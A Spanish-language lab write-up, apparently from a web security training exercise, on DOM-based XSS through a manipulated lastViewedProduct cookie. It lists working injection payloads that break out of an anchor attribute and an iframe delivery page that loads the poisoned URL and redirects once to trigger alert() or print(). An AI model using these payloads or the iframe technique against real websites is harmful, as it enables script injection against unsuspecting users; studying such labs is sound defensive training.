En este laboratorio trabajamos con una vulnerabilidad de tipo XSS basada en la manipulación de cookies mediante JavaScript en el lado del cliente. La web almacena en una cookie llamada lastViewedProduct la última URL de producto visitada, la cual es luego procesada sin validación.

El ataque consiste en forzar a la víctima a cargar una URL de producto con código malicioso embebido, lo que provoca que dicha URL sea almacenada como cookie. Justo después, la víctima es redirigida a la página de inicio. Al acceder a esa página con la cookie manipulada, se evalúa su contenido y se ejecuta el payload XSS. Con esto conseguimos que la función print() se dispare sin que el usuario sospeche nada

-----


    productId=10&'

Como la URL de last_view_post está dentro de un anchor, podemos escalar del anchor y meter una etiqueta HTML:
    
    productId=10&'><h1>Hola</h1>

Al irnos a Home, setea la nueva url con el hola en html, ahora metemos el alert:

    productId=10&'><script>alert()</script>

```html

<iframe src="https://burpsuite.com/productId=10&'><script>alert()</script>" onload='this.src="https://google.es"'></iframe>   ->(esto lo hará muchas veces, de manera infinita)

Para evitar que haga infinitamente eso, podemos setear un valor de x para que cuando se cumpla 1 sola vez, ya no ejecute la redirecccion:

<iframe src="https://burpsuite.com/productId=10&'><script>alert()</script>" onload='if(!x)this.src="https://google.es";x=1;'></iframe>

<iframe src="https://burpsuite.com/productId=10&'><script>alert()</script>" onload='if(!window.x)this.src="https://google.es";window.x=1;'></iframe>

Entonces primero enviamos a la victima a la raiz para que setee el alert dentro del url:

<iframe src="https://burpsuite.com/productId=10&'><script>alert()</script>" onload='if(!window.x)this.src="https://burpsuite.com/";window.x=1;'></iframe>

<iframe src="https://burpsuite.com/productId=10&'><script>print()</script>" onload='if(!window.x)this.src="https://burpsuite.com/";window.x=1;'></iframe>



```



